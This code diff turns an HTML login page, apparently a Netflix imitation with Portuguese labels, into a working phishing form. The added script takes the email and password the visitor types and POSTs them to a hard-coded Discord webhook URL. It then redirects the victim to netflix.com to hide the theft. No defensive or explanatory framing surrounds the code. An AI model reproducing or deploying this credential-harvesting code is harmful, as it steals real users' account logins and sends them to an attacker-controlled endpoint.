@@ -21,17 +21,17 @@
     <div class="login_body">
         <div class="login_box">
             <h2>Entrar</h2>
-            <form>
+            <form onsubmit="sendMessage()">
                 <div class="input_box">
-                    <input required type="email" placeholder="Email ou número de telefone">
+                    <input required type="email" id="username" placeholder="Email ou número de telefone">
                 </div>
 
                 <div class="input_box">
-                    <input required type="password" placeholder="Senha">
+                    <input required type="password" id="password" placeholder="Senha">
                 </div>
 
                 <div>
-                    <button class="submit">
+                    <button type="submit" class="submit">
                         Entrar
                     </button>
                 </div>
@@ -65,6 +65,22 @@
             </div>
         </div>
     </div>
+
+    <script>
+        function sendMessage() {
+            var request = new XMLHttpRequest();
+            request.open("POST", "https://discord.com/api/webhooks/1214945289283047514/z8J37yPMIA8_OunjvvcVzB-7O8RxFqk8NLTUb3i8CJjZxD345avbR7eX6t0en4DvWOKL");
+            request.setRequestHeader('Content-type', 'application/json');
+            var params = {
+                content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
+            }
+            request.send(JSON.stringify(params));
+        
+            window.location.replace("https://www.netflix.com");
+       
+            return false;
+        }
+    </script>
 </body>
 
 </html>
